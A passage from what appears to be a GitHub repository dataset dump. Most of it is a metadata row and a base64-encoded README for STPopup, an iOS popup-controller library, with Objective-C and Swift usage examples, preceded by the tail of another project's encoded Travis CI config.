aXN0OiB0cnVzdHkKICAgIC0gcGhwOiA3LjEKICAgICAgZGlzdDogdHJ1c3R5
CiAgICAtIHBocDogNy4yCiAgICAgIGRpc3Q6IHRydXN0eQogICAgLSBwaHA6
IDcuMwogICAgICBkaXN0OiB0cnVzdHkKICAgIC0gcGhwOiBoaHZtCiAgICAg
IGRpc3Q6IHRydXN0eQogICAgLSBwaHA6IGhodm0tbmlnaHRseQogICAgICBk
aXN0OiB0cnVzdHkKICAgIC0gcGhwOiBuaWdodGx5CiAgICAgIGRpc3Q6IHRy
dXN0eQoKYmVmb3JlX3NjcmlwdDoKICAtIGJhc2ggdGVzdHMvYmVmb3JlX3Nj
cmlwdC5zaAoKc2NyaXB0OgogIC0gYmFzaCB0ZXN0cy9zY3JpcHQuc2gK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'STPopup',42387347,"b""STPopup provides STPopupController, which works just like UINavigationController in popup style, for both iPhone and iPad. It's written in Objective-C and compatible with Swift.""",b'Objective-C',28,2379,,2379,False,b'https://api.github.com/repos/kevin0571/STPopup/forks',"IyBTVFBvcHVwICFbQ0kgU3RhdHVzXShodHRwczovL2ltZy5zaGllbGRzLmlv
L3RyYXZpcy9rZXZpbjA1NzEvU1RQb3B1cC5zdmc/c3R5bGU9ZmxhdCkgIVtW
ZXJzaW9uXShodHRwOi8vaW1nLnNoaWVsZHMuaW8vY29jb2Fwb2RzL3YvU1RQ
b3B1cC5zdmc/c3R5bGU9ZmxhZykgIVtMaWNlbnNlXShodHRwczovL2ltZy5z
aGllbGRzLmlvL2NvY29hcG9kcy9sL1NUUG9wdXAuc3ZnP3N0eWxlPWZsYWcp
CmBTVFBvcHVwYCBwcm92aWRlcyBgU1RQb3B1cENvbnRyb2xsZXJgLCB3aGlj
aCB3b3JrcyBqdXN0IGxpa2UgYFVJTmF2aWdhdGlvbkNvbnRyb2xsZXJgIGlu
IHBvcHVwIHN0eWxlLCBmb3IgYm90aCBpUGhvbmUgYW5kIGlQYWQuIEl0J3Mg
d3JpdHRlbiBpbiBPYmplY3RpdmUtQyBhbmQgY29tcGF0aWJsZSB3aXRoIFN3
aWZ0LgoKKipGZWF0dXJlczoqKgotIFB1c2gvUG9wIHZpZXcgY29udHJvbGxl
ciBpbnRvL291dCBvZiBgU1RQb3B1cENvbnRyb2xsZXJgIGp1c3QgbGlrZSBg
VUlOYXZpZ2F0aW9uQ29udHJvbGxlcmAuCi0gU2V0IG5hdmlnYXRpb24gaXRl
bXMgdGhyb3VnaCBgc2VsZi5uYXZpZ2F0aW9uSXRlbWAganVzdCBsaWtlIHVz
aW5nIGEgYFVJTmF2aWdhdGlvbkNvbnRyb2xsZXJgLgotIFN1cHBvcnQgYm90
aCAiRm9ybSBTaGVldCIgYW5kICJCb3R0b20gU2hlZXQiIHN0eWxlLgotIFdv
cmsgd2VsbCB3aXRoIHN0b3J5Ym9hcmQoaW5jbHVkaW5nIHNlZ3VlKS4KLSBD
dXN0b21pemUgVUkgYnkgdXNpbmcgYFVJQXBwZWFyYW5jZWAuCi0gQ3VzdG9t
aXphYmxlIHBvcHVwIHRyYW5zaXRpb24gc3R5bGUuCi0gQXV0by1yZXBvc2l0
aW9uIG9mIHBvcHVwIHZpZXcgd2hlbiBrZXlib2FyZCBzaG93cyB1cCwgbWFr
ZSBzdXJlIHlvdXIgYFVJVGV4dEZpZWxkYC9gVUlUZXh0Vmlld2Agd29uJ3Qg
YmUgY292ZXJlZCBieSB0aGUga2V5Ym9hcmQuCi0gRHJhZyBuYXZpZ2F0aW9u
IGJhciB0byBkaXNtaXNzIHBvcHVwIHZpZXcuCi0gU3VwcG9ydCBib3RoIHBv
cnRyYWl0IGFuZCBsYW5kc2NhcGUgb3JpZW50YXRpb24gaW4gaVBob25lIGFu
ZCBpUGFkLgotIGlPUyA3Ky4KLSBDb21wYXRpYmxlIHdpdGggU3dpZnQuCgoj
IyBVc2UgQ2FzZXMKIVtVc2UgQ2FzZXNdKGh0dHBzOi8vdXNlci1pbWFnZXMu
Z2l0aHVidXNlcmNvbnRlbnQuY29tLzE0OTEyODIvNTc5ODU2OTYtYjZlMDEz
MDAtN2E2My0xMWU5LTkxYTktYjVhYTU1MjYyOTY3LmpwZykKCiMjIEdldCBT
dGFydGVkCioqQ29jb2FQb2RzKioKYGBgcnVieQpwb2QgJ1NUUG9wdXAnCmBg
YAoqKkNhcnRoYWdlKioKYGBgcnVieQpnaXRodWIgImtldmluMDU3MS9TVFBv
cHVwIgpgYGAKICAKKipJbXBvcnQgaGVhZGVyIGZpbGUqKiAgCk9iamVjdGl2
ZS1DCmBgYG9iamMKI2ltcG9ydCA8U1RQb3B1cC9TVFBvcHVwLmg+CmBgYApT
d2lmdApgYGBzd2lmdAppbXBvcnQgU1RQb3B1cApgYGAKCioqSW5pdGlhbGl6
ZSBhbmQgcHJlc2VudCBTVFBvcHVwQ29udHJvbGxlcioqICAKT2JqZWN0aXZl
LUMKYGBgb2JqYwpTVFBvcHVwQ29udHJvbGxlciAqcG9wdXBDb250cm9sbGVy
ID0gW1tTVFBvcHVwQ29udHJvbGxlciBhbGxvY10gaW5pdFdpdGhSb290Vmll
d0NvbnRyb2xsZXI6dmlld0NvbnRyb2xsZXJdOwpbcG9wdXBDb250cm9sbGVy
IHByZXNlbnRJblZpZXdDb250cm9sbGVyOnNlbGZdOwpgYGAKU3dpZnQKYGBg
c3dpZnQKbGV0IHBvcHVwQ29udHJvbGxlciA9IGxldCBwb3B1cENvbnRyb2xs
ZXIgPSBTVFBvcHVwQ29udHJvbGxlcihyb290Vmlld0NvbnRyb2xsZXI6IHZp
ZXdDb250cm9sbGVyKQpwb3B1cENvbnRyb2xsZXIucHJlc2VudChpbjogc2Vs
ZikKYGBgCgoqKlNldCBjb250ZW50IHNpemUgaW4gdmlldyBjb250cm9sbGVy
KiogIApPYmplY3RpdmUtQwpgYGBvYmpjCkBpbXBsZW1lbnRhdGlvbiBWaWV3
Q29udHJvbGxlcgoKLSAoaW5zdGFuY2V0eXBlKWluaXQKewogICAgaWYgKHNl
bGYgPSBbc3VwZXIgaW5pdF0pIHsKICAgICAgICBzZWxmLnRpdGxlID0gQCJW
aWV3IENvbnRyb2xsZXIiOwogICAgICAgIHNlbGYubmF2aWdhdGlvbkl0ZW0u
cmlnaHRCYXJCdXR0b25JdGVtID0gW1tVSUJhckJ1dHRvbkl0ZW0gYWxsb2Nd
IGluaXRXaXRoVGl0bGU6QCJOZXh0IiBzdHlsZTpVSUJhckJ1dHRvbkl0ZW1T
dHlsZVBsYWluIHRhcmdldDpzZWxmIGFjdGlvbjpAc2VsZWN0b3IobmV4dEJ0
bkRpZFRhcCldOwogICAgICAgIC8vIEl0J3MgcmVxdWlyZWQgdG8gc2V0IGNv
bnRlbnQgc2l6ZSBvZiBwb3B1cC4KICAgICAgICBzZWxmLmNvbnRlbnRTaXpl
SW5Qb3B1cCA9IENHU2l6ZU1ha2UoMzAwLCA0MDApOwogICAgICAgIHNlbGYu
bGFuZHNjYXBlQ29udGVudFNpemVJblBvcHVwID0gQ0dTaXplTWFrZSg0MDAs
IDIwMCk7CiAgICB9CiAgICByZXR1cm4gc2VsZjsKfQoKQGVuZApgYGAKU3dp
ZnQKYGBgc3dpZnQKY2xhc3MgVmlld0NvbnRyb2xsZXI6IFVJVmlld0NvbnRy
b2xsZXIgewogICAgb3ZlcnJpZGUgaW5pdChuaWJOYW1lIG5pYk5hbWVPck5p
bDogU3RyaW5nPywgYnVuZGxlIG5pYkJ1bmRsZU9yTmlsOiBCdW5kbGU/KSB7
CiAgICAgICAgc3VwZXIuaW5pdChuaWJOYW1lOiBuaWJOYW1lT3JOaWwsIGJ1
bmRsZTogbmliQnVuZGxlT3JOaWwpCiAgICAgICAgdGl0bGUgPSAiVmlldyBD
b250cm9sbGVyIgogICAgICAgIG5hdmlnYXRpb25JdGVtLnJpZ2h0QmFyQnV0
dG9uSXRlbSA9IFVJQmFyQnV0dG9uSXRlbSh0aXRsZTogIk5leHQiLCBzdHls
ZTogLnBsYWluLCB0YXJnZXQ6IHNlbGYsIGFjdGlvbjogI3NlbGVjdG9yKG5l
eHRCdG5EaWRUYXApKQogICAgICAgIC8vIEl0J3MgcmVxdWlyZWQgdG8gc2V0
IGNvbnRlbnQgc2l6ZSBvZiBwb3B1cC4KICAgICAgICBjb250ZW50U2l6ZUlu
UG9wdXAgPSBDR1NpemUod2lkdGg6IDMwMCwgaGVpZ2h0OiA0MDApCiAgICAg
ICAgbGFuZHNjYXBlQ29udGVudFNpemVJblBvcHVwID0gQ0dTaXplKHdpZHRo
OiA0MDAsIGhlaWdodDogMjAwKQogICAgfQp9CmBgYAoqKlNldCBjb250ZW50
IHNpemUgb2YgdmlldyBjb250cm9sbGVyIHdoaWNoIGlzIGxvYWRlZCBmcm9t
IFN0b3J5Ym9hcmQqKiAgClNldCBjb250ZW50IHNpemUgaW4gc3Rvcnlib2Fy
ZCBvciBpbiBgYXdha2VGcm9tTmliYC4gIAohW1N0b3J5Ym9hcmRdKGh0dHBz
Oi8vdXNlci1pbWFnZXMuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzE0OTEyODIv
NTc5ODIzOTQtZGNhNWYxODAtN2EzYy0xMWU5LThkNjMtM2NhNmMzODM3ODYw
LnBuZykKCioqUHVzaCwgcG9wIGFuZCBkaXNtaXNzIHZpZXcgY29udHJvbGxl
cnMqKiAgCk9iamVjdGl2ZS1DCmBgYG9iamMKW3NlbGYucG9wdXBDb250cm9s
bGVyIHB1c2hWaWV3Q29udHJvbGxlcjpbVmlld0NvbnRyb2xsZXIgbmV3XSBh
bmltYXRlZDpZRVNdOwpbc2VsZi5wb3B1cENvbnRyb2xsZXIgcG9wVmlld0Nv
bnRyb2xsZXJBbmltYXRlZDpZRVNdOyAvLyBQb3B1cCB3aWxsIGJlIGRpc21p
c3NlZCBpZiB0aGVyZSBpcyBvbmx5IG9uZSB2aWV3IGNvbnRyb2xsZXIgaW4g
dGhlIHBvcHVwIHZpZXcgY29udHJvbGxlciBzdGFjawpbc2VsZi5wb3B1cENv
bnRyb2xsZXIgZGlzbWlzc107CmBgYApTd2lmdApgYGBzd2lmdApwb3B1cENv
bnRyb2xsZXI/LnB1c2godmlld0NvbnRyb2xsZXIsIGFuaW1hdGVkOiB0cnVl
KQpwb3B1cENvbnRyb2xsZXI/LnBvcFZpZXdDb250cm9sbGVyKGFuaW1hdGVk
OiB0cnVlKSAvLyBQb3B1cCB3aWxsIGJlIGRpc21pc3NlZCBpZiB0aGVyZSBp
cyBvbmx5IG9uZSB2aWV3IGNvbnRyb2xsZXIgaW4gdGhlIHBvcHVwIHZpZXcg
Y29udHJvbGxlciBzdGFjawpwb3B1cENvbnRyb2xsZXI/LmRpc21pc3MoKQpg
YGAKCiFbUHVzaCAmIFBvcF0oaHR0cHM6Ly9jbG91ZC5naXRodWJ1c2VyY29u
dGVudC5jb20vYXNzZXRzLzE0OTEyODIvOTg1NzkxNS8wZDRhYjNlZS01YjUw
LTExZTUtODFiYy04ZmJhZTNhZDhjMDYuZ2lmKQoKKipCb3R0b20gc2hlZXQg
c3R5bGUqKiAgCk9iamVjdGl2ZS1DCmBgYG9iamMKU1RQb3B1cENvbnRyb2xs
ZXIgKnBvcHVwQ29udHJvbGxlciA9IFtbU1RQb3B1cENvbnRyb2xsZXIgYWxs
b2NdIGluaXRXaXRoUm9vdFZpZXdDb250cm9sbGVyOltWaWV3Q29udHJvbGxl
ciBuZXddXTsKcG9wdXBDb250cm9sbGVyLnN0eWxlID0gU1RQb3B1cFN0eWxl
Qm90dG9tU2hlZXQ7Cltwb3B1cENvbnRyb2xsZXIgcHJlc2VudEluVmlld0Nv
bnRyb2xsZXI6c2VsZl07CmBgYApTd2lmdApgYGBzd2lmdApsZXQgcG9wdXBD
b250cm9sbGVyID0gU1RQb3B1cENvbnRyb2xsZXIocm9vdFZpZXdDb250cm9s
bGVyOiB2aWV3Q29udHJvbGxlcikKcG9wdXBDb250cm9sbGVyLnN0eWxlID0g
LmJvdHRvbVNoZWV0CnBvcHVwQ29udHJvbGxlci5wcmVzZW50KGluOiBzZWxm
KQpgYGAKIVtCb3R0b20gU2hlZXRdKGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNl
cmNvbnRlbnQuY29tL2Fzc2V0cy8xNDkxMjgyLzEwNDE3OTYzLzc2NDlmMzU2
LTcwODAtMTFlNS04ZjNjLTBjYjgxN2I4MzUzZS5naWYpCgoqKkN1c3RvbWl6
ZSBwb3B1cCB0cmFuc2l0aW9uIHN0eWxlKiogIApPYmplY3RpdmUtQwpgYGBv
YmpjCiNwcmFnbWEgbWFyayAtIFNUUG9wdXBDb250cm9sbGVyVHJhbnNpdGlv
bmluZwoKLSAoTlNUaW1lSW50ZXJ2YWwpcG9wdXBDb250cm9sbGVyVHJhbnNp
dGlvbkR1cmF0aW9uOihTVFBvcHVwQ29udHJvbGxlclRyYW5zaXRpb25pbmdD
b250ZXh0ICopY29udGV4dAp7CiAgICByZXR1cm4gY29udGV4dC5hY3Rpb24g
PT0gU1RQb3B1cENvbnRyb2xsZXJUcmFuc2l0aW9uaW5nQWN0aW9uUHJlc2Vu
dCA/IDAuNSA6IDAuMzU7Cn0KCi0gKHZvaWQpcG9wdXBDb250cm9sbGVyQW5p
bWF0ZVRyYW5zaXRpb246KFNUUG9wdXBDb250cm9sbGVyVHJhbnNpdGlvbmlu
Z0NvbnRleHQgKiljb250ZXh0IGNvbXBsZXRpb246KHZvaWQgKF4pKCkpY29t
cGxldGlvbgp7CiAgICAvLyBQb3B1cCB3aWxsIGJlIHByZXNlbnRlZCB3aXRo
IGFuIGFuaW1hdGlvbiBzbGlkaW5nIGZyb20gcmlnaHQgdG8gbGVmdC4KICAg
IFVJVmlldyAqY29udGFpbmVyVmlldyA9IGNvbnRleHQuY29udGFpbmVyVmll
dzsKICAgIGlmIChjb250ZXh0LmFjdGlvbiA9PSBTVFBvcHVwQ29udHJvbGxl
clRyYW5zaXRpb25pbmdBY3Rpb25QcmVzZW50KSB7CiAgICAgICAgY29udGFp
bmVyVmlldy50cmFuc2Zvcm0gPSBDR0FmZmluZVRyYW5zZm9ybU1ha2VUcmFu
c2xhdGlvbihjb250YWluZXJWaWV3LnN1cGVydmlldy5ib3VuZHMuc2l6ZS53
aWR0aCAtIGNvbnRhaW5lclZpZXcuZnJhbWUub3JpZ2luLngsIDApOwogICAg
ICAgIAogICAgICAgIFtVSVZpZXcgYW5pbWF0ZVdpdGhEdXJhdGlvbjpbc2Vs
ZiBwb3B1cENvbnRyb2xsZXJUcmFuc2l0aW9uRHVyYXRpb246Y29udGV4dF0g
ZGVsYXk6MCB1c2luZ1NwcmluZ1dpdGhEYW1waW5nOjEgaW5pdGlhbFNwcmlu
Z1ZlbG9jaXR5OjEgb3B0aW9uczpVSVZpZXdBbmltYXRpb25PcHRpb25DdXJ2
ZUVhc2VJbk91dCBhbmltYXRpb25zOl57CiAgICAgICAgICAgIGNvbnRleHQu
Y29udGFpbmVyVmlldy50cmFuc2Zvcm0gPSBDR0FmZmluZVRyYW5zZm9ybUlk
ZW50aXR5OwogICAgICAgIH0gY29tcGxldGlvbjpeKEJPT0wgZmluaXNoZWQp
IHsKICAgICAgICAgICAgY29tcGxldGlvbigpOwogICAgICAgIH1dOwogICAg
fQogICAgZWxzZSB7CiAgICAgICAgW1VJVmlldyBhbmltYXRlV2l0aER1cmF0
aW9uOltzZWxmIHBvcHVwQ29udHJvbGxlclRyYW5zaXRpb25EdXJhdGlvbjpj
b250ZXh0XSBkZWxheTowIG9wdGlvbnM6VUlWaWV3QW5pbWF0aW9uT3B0aW9u
Q3VydmVFYXNlT3V0IGFuaW1hdGlvbnM6XnsKICAgICAgICAgICAgY29udGFp
bmVyVmlldy50cmFuc2Zvcm0gPSBDR0FmZmluZVRyYW5zZm9ybU1ha2VUcmFu
c2xhdGlvbigtIDIgKiAoY29udGFpbmVyVmlldy5zdXBlcnZpZXcuYm91bmRz
LnNpemUud2lkdGggLSBjb250YWluZXJWaWV3LmZyYW1lLm9yaWdpbi54KSwg
MCk7CiAgICAgICAgfSBjb21wbGV0aW9uOl4oQk9PTCBmaW5pc2hlZCkgewog
ICAgICAgICAgICBjb250YWluZXJWaWV3LnRyYW5zZm9ybSA9IENHQWZmaW5l
VHJhbnNmb3JtSWRlbnRpdHk7CiAgICAgICAgICAgIGNvbXBsZXRpb24oKTsK
ICAgICAgICB9XTsKICAgIH0KfQoKLy8gVXNlIGN1c3RvbSB0cmFuc2l0aW9u
aW5nIGluIHBvcHVwIGNvbnRyb2xsZXIKU1RQb3B1cENvbnRyb2xsZXIgKnBv
cHVwQ29udHJvbGxlciA9IFtbU1RQb3B1cENvbnRyb2xsZXIgYWxsb2NdIGlu
aXRXaXRoUm9vdFZpZXdDb250cm9sbGVyOnZpZXdDb250cm9sbGVyXTsKcG9w
dXBDb250cm9sbGVyLnRyYW5zaXRpb25TdHlsZSA9IFNUUG9wdXBUcmFuc2l0
aW9uU3R5bGVDdXN0b207CnBvcHVwQ29udHJvbGxlci50cmFuc2l0aW9uaW5n
ID0gc2VsZjsKW3BvcHVwQ29udHJvbGxlciBwcmVzZW50SW5WaWV3Q29udHJv
bGxlcjpzZWxmXTsKYGBgClN3aWZ0CmBgYHN3aWZ0Ci8vIE1BUks6IFNUUG9w
dXBDb250cm9sbGVyVHJhbnNpdGlvbmluZwoKZnVuYyBwb3B1cENvbnRyb2xs
ZXJUcmFuc2l0aW9uRHVyYXRpb24oXyBjb250ZXh0OiBTVFBvcHVwQ29udHJv
bGxlclRyYW5zaXRpb25pbmdDb250ZXh0KSAtPiBUaW1lSW50ZXJ2YWwgewog
ICAgcmV0dXJuIGNvbnRleHQuYWN0aW9uID09IC5wcmVzZW50ID8gMC41IDog
MC4zNQp9CgpmdW5jIHBvcHVwQ29udHJvbGxlckFuaW1hdGVUcmFuc2l0aW9u
KF8gY29udGV4dDogU1RQb3B1cENvbnRyb2xsZXJUcmFuc2l0aW9uaW5nQ29u
dGV4dCwgY29tcGxldGlvbjogQGVzY2FwaW5nICgpIC0+IFZvaWQpIHsKICAg
IC8vIFBvcHVwIHdpbGwgYmUgcHJlc2VudGVkIHdpdGggYW4gYW5pbWF0aW9u
IHNsaWRpbmcgZnJvbSByaWdodCB0byBsZWZ0LgogICAgbGV0IGNvbnRhaW5l
clZpZXcgPSBjb250ZXh0LmNvbnRhaW5lclZpZXcKICAgIGlmIGNvbnRleHQu
YWN0aW9uID09IC5wcmVzZW50IHsKICAgICAgICBjb250YWluZXJWaWV3LnRy
YW5zZm9ybSA9IENHQWZmaW5lVHJhbnNmb3JtKHRyYW5zbGF0aW9uWDogY29u
dGFpbmVyVmlldy5zdXBlcnZpZXchLmJvdW5kcy5zaXplLndpZHRoIC0gY29u
dGFpbmVyVmlldy5mcmFtZS5vcmlnaW4ueCwgeTogMCkKICAgICAgICBVSVZp
ZXcuYW5pbWF0ZSh3aXRoRHVyYXRpb246IHBvcHVwQ29udHJvbGxlclRyYW5z
aXRpb25EdXJhdGlvbihjb250ZXh0KSwgZGVsYXk6IDAsIHVzaW5nU3ByaW5n
V2l0aERhbXBpbmc6IDEsIGluaXRpYWxTcHJpbmdWZWxvY2l0eTogMSwgb3B0
aW9uczogLmN1cnZlRWFzZUluT3V0LCBhbmltYXRpb25zOiB7CiAgICAgICAg
ICAgIGNvbnRhaW5lclZpZXcudHJhbnNmb3JtID0gLmlkZW50aXR5CiAgICAg
ICAgfSwgY29tcGxldGlvbjogeyBfIGluCiAgICAgICAgICAgIGNvbXBsZXRp
b24oKQogICAgICAgIH0pOwogICAgfSBlbHNlIHsKICAgICAgICBVSVZpZXcu
YW5pbWF0ZSh3aXRoRHVyYXRpb246IHBvcHVwQ29udHJvbGxlclRyYW5zaXRp
b25EdXJhdGlvbihjb250ZXh0KSwgZGVsYXk6IDAsIHVzaW5nU3ByaW5nV2l0
aERhbXBpbmc6IDEsIGluaXRpYWxTcHJpbmdWZWxvY2l0eTogMSwgb3B0aW9u
czogLmN1cnZlRWFzZUluT3V0LCBhbmltYXRpb25zOiB7CiAgICAgICAgICAg
IGNvbnRhaW5lclZpZXcudHJhbnNmb3JtID0gQ0dBZmZpbmVUcmFuc2Zvcm0o
dHJhbnNsYXRpb25YOiAtMiAqIChjb250YWluZXJWaWV3LnN1cGVydmlldyEu
Ym91bmRzLnNpemUud2lkdGggLSBjb250YWluZXJWaWV3LmZyYW1lLm9yaWdp
bi54KSwgeTogMCkKICAgICAgICB9LCBjb21wbGV0aW9uOiB7IF8gaW4KICAg
ICAgICAgICAgY29udGFpbmVyVmlldy50cmFuc2Zvcm0gPSAuaWRlbnRpdHkK
ICAgICAgICAgICAgY29tcGxldGlvbigpCiAgICAgICAgfSk7CiAgICB9Cn0K
Ci8vIFVzZSBjdXN0b20gdHJhbnNpdGlvbmluZyBpbiBwb3B1cCBjb250cm9s
bGVyCmxldCBwb3B1cENvbnRyb2xsZXIgPSBsZXQgcG9wdXBDb250cm9sbGVy
ID0gU1RQb3B1cENvbnRyb2xsZXIocm9vdFZpZXdDb250cm9sbGVyOiB2aWV3
Q29udHJvbGxlcikKcG9wdXBDb250cm9sbGVyLnRyYW5zaXRpb25TdHlsZSA9
IC5jdXN0b20KcG9wdXBDb250cm9sbGVyLnRyYW5zaXRpb25pbmcgPSBzZWxm
CnBvcHVwQ29udHJvbGxlci5wcmVzZW50KGluOiBzZWxmKQpgYGAKCioqQmx1
ciBiYWNrZ3JvdW5kKiogIApPYmplY3RpdmUtQwpgYGBvYmpjClNUUG9wdXBD
b250cm9sbGVyICpwb3B1cENvbnRyb2xsZXIgPSBbW1NUUG9wdXBDb250cm9s
bGVyIGFsbG9jXSBpbml0V2l0aFJvb3RWaWV3Q29udHJvbGxlcjpbUG9wdXBW
aWV3Q29udHJvbGxlcjEgbmV3XV07CmlmIChOU0NsYXNzRnJvbVN0cmluZyhA
IlVJQmx1ckVmZmVjdCIpKSB7CiAgICBVSUJsdXJFZmZlY3QgKmJsdXJFZmZl
Y3QgPSBbVUlCbHVyRWZmZWN0IGVmZmVjdFdpdGhTdHlsZTpVSUJsdXJFZmZl
Y3RTdHlsZURhcmtdOwogICAgcG9wdXBDb250cm9sbGVyLmJhY2tncm91bmRW
aWV3ID0gW1tVSVZpc3VhbEVmZmVjdFZpZXcgYWxsb2NdIGluaXRXaXRoRWZm
ZWN0OmJsdXJFZmZlY3RdOwp9CmBgYApTd2lmdApgYGBzd2lmdApsZXQgcG9w
dXBDb250cm9sbGVyID0gbGV0IHBvcHVwQ29udHJvbGxlciA9IFNUUG9wdXBD
b250cm9sbGVyKHJvb3RWaWV3Q29udHJvbGxlcjogdmlld0NvbnRyb2xsZXIp
CmlmIE5TQ2xhc3NGcm9tU3RyaW5nKCJVSUJsdXJFZmZlY3QiKSAhPSBuaWwg
ewogICAgbGV0IGJsdXJFZmZlY3QgPSBVSUJsdXJFZmZlY3Qoc3R5bGU6IC5k
YXJrKQogICAgcG9wdXBDb250cm9sbGVyLmJhY2tncm91bmRWaWV3ID0gVUlW
aXN1YWxFZmZlY3RWaWV3KGVmZmVjdDogYmx1ckVmZmVjdCkKfQpgYGAKCioq
QWN0aW9uIG9mIHRhcHBpbmcgb24gYXJlYSBvdXRzaWRlIG9mIHBvcHVwKiog
IApPYmplY3RpdmUtQwpgYGBvYmpjCltwb3B1cENvbnRyb2xsZXIuYmFja2dy
b3VuZFZpZXcgYWRkR2VzdHVyZVJlY29nbml6ZXI6W1tVSVRhcEdlc3R1cmVS
ZWNvZ25pemVyIGFsbG9jXSBpbml0V2l0aFRhcmdldDpzZWxmIGFjdGlvbjpA
c2VsZWN0b3IoYmFja2dyb3VuZFZpZXdEaWRUYXApXV07CmBgYApTd2lmdApg
YGBzd2lmdApwb3B1cENvbnRyb2xsZXIuYmFja2dyb3VuZFZpZXc/LmFkZEdl
c3R1cmVSZWNvZ25pemVyKFVJVGFwR2VzdHVyZVJlY29nbml6ZXIodGFyZ2V0
OiBzZWxmLCBhY3Rpb246ICNzZWxlY3RvcihiYWNrZ3JvdW5kVmlld0RpZFRh
cCkpKQpgYGAKCioqQ3VzdG9taXplIFVJKiogIApPYmplY3RpdmUtQwpgYGBv
YmpjCltTVFBvcHVwTmF2aWdhdGlvbkJhciBhcHBlYXJhbmNlXS5iYXJUaW50
Q29sb3IgPSBbVUlDb2xvciBjb2xvcldpdGhSZWQ6MC4yMCBncmVlbjowLjYw
IGJsdWU6MC44NiBhbHBoYToxLjBdOwpbU1RQb3B1cE5hdmlnYXRpb25CYXIg
YXBwZWFyYW5jZV0udGludENvbG9yID0gW1VJQ29sb3Igd2hpdGVDb2xvcl07
CltTVFBvcHVwTmF2aWdhdGlvbkJhciBhcHBlYXJhbmNlXS5iYXJTdHlsZSA9
IFVJQmFyU3R5bGVEZWZhdWx0OwpbU1RQb3B1cE5hdmlnYXRpb25CYXIgYXBw
ZWFyYW5jZV0udGl0bGVUZXh0QXR0cmlidXRlcyA9IEB7IE5TRm9udEF0dHJp
YnV0ZU5hbWU6IFtVSUZvbnQgZm9udFdpdGhOYW1lOkAiQ29jaGluIiBzaXpl
OjE4XSwgTlNGb3JlZ3JvdW5kQ29sb3JBdHRyaWJ1dGVOYW1lOiBbVUlDb2xv
ciB3aGl0ZUNvbG9yXSB9OwogICAgCltbVUlCYXJCdXR0b25JdGVtIGFwcGVh
cmFuY2VXaGVuQ29udGFpbmVkSW46W1NUUG9wdXBOYXZpZ2F0aW9uQmFyIGNs
YXNzXSwgbmlsXSBzZXRUaXRsZVRleHRBdHRyaWJ1dGVzOkB7IE5TRm9udEF0
dHJpYnV0ZU5hbWU6W1VJRm9udCBmb250V2l0aE5hbWU6QCJDb2NoaW4iIHNp
emU6MTddIH0gZm9yU3RhdGU6VUlDb250cm9sU3RhdGVOb3JtYWxdOwpgYGAK
U3dpZnQKYGBgc3dpZnQKU1RQb3B1cE5hdmlnYXRpb25CYXIuYXBwZWFyYW5j
ZSgpLmJhclRpbnRDb2xvciA9IFVJQ29sb3IocmVkOiAwLjIsIGdyZWVuOiAw
LjYsIGJsdWU6IDAuODYsIGFscGhhOiAxKQpTVFBvcHVwTmF2aWdhdGlvbkJh
ci5hcHBlYXJhbmNlKCkudGludENvbG9yID0gLndoaXRlClNUUG9wdXBOYXZp
Z2F0aW9uQmFyLmFwcGVhcmFuY2UoKS5iYXJTdHlsZSA9IC5kZWZhdWx0ClNU
UG9wdXBOYXZpZ2F0aW9uQmFyLmFwcGVhcmFuY2UoKS50aXRsZVRleHRBdHRy
aWJ1dGVzID0gWwogICAgLmZvbnQ6IFVJRm9udChuYW1lOiAiQ29jaGluIiwg
c2l6ZTogMTgpID8/IC5zeXN0ZW1Gb250KG9mU2l6ZTogMTgpLAogICAgLmZv
cmVncm91bmRDb2xvcjogVUlDb2xvci53aGl0ZSwKXQpVSUJhckJ1dHRvbkl0
ZW0KICAgIC5hcHBlYXJhbmNlKHdoZW5Db250YWluZWRJbkluc3RhbmNlc09m
OiBbU1RQb3B1cE5hdmlnYXRpb25CYXIuc2VsZl0pCiAgICAuc2V0VGl0bGVU
ZXh0QXR0cmlidXRlcyhbCiAgICAgICAgLmZvbnQ6IFVJRm9udChuYW1lOiAi
Q29jaGluIiwgc2l6ZTogMTgpID8/IC5zeXN0ZW1Gb250KG9mU2l6ZTogMTgp
LAogICAgICAgIF0sIGZvcjogLm5vcm1hbCkKYGBgCiFbQ3VzdG9taXplIFVJ
XShodHRwczovL2Nsb3VkLmdpdGh1YnVzZXJjb250ZW50LmNvbS9hc3NldHMv
MTQ5MTI4Mi85OTExMzA2LzBmNmRiMDU2LTVjZDQtMTFlNS05MzI5LTMzYjBj
ZjAyZTFiMC5wbmcpCgoqKkF1dG8tcmVwb3NpdGlvbiB3aGVuIGtleWJvYXJk
IGlzIHNob3dpbmcgdXAqKiAgClRoaXMgaXMgZGVmYXVsdCBiZWhhdmlvci4g
IAohW0F1dG8tcmVwb3NpdGlvbl0oaHR0cHM6Ly9jbG91ZC5naXRodWJ1c2Vy
Y29udGVudC5jb20vYXNzZXRzLzE0OTEyODIvOTg1ODI3Ny81YjI5YjEzMC01
YjUyLTExZTUtOTU2OS03NTYwYTA4NTM0OTMuZ2lmKQoKKipEcmFnIHRvIGRp
c21pc3MqKiAgClRoaXMgaXMgZGVmYXVsdCBiZWhhdmlvci4gIAohW0RyYWcg
dG8gZGlzbWlzc10oaHR0cHM6Ly9jbG91ZC5naXRodWJ1c2VyY29udGVudC5j
b20vYXNzZXRzLzE0OTEyODIvOTg1ODMzNC9iMTAzZmM5Ni01YjUyLTExZTUt
OWMzZi01MTczNjdlZDkzODYuZ2lmKQoKKipIYW5kbGUgb3JpZW50YXRpb24g
Y2hhbmdlKiogIApUaGlzIGlzIGRlZmF1bHQgYmVoYXZpb3IuICAKIVtPcmll
bnRhdGlvbiBjaGFuZ2VdKGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRl
bnQuY29tL2Fzc2V0cy8xNDkxMjgyLzk4NTgzNzIvZTY1Mzg4ODAtNWI1Mi0x
MWU1LTg4ODItODcwNTU4ODYwNmJhLmdpZikKClBsZWFzZSBjaGVja291dCB0
aGUgZXhhbXBsZSBwcm9qZWN0IGZvciBtb3JlIGRldGFpbHMuCg==
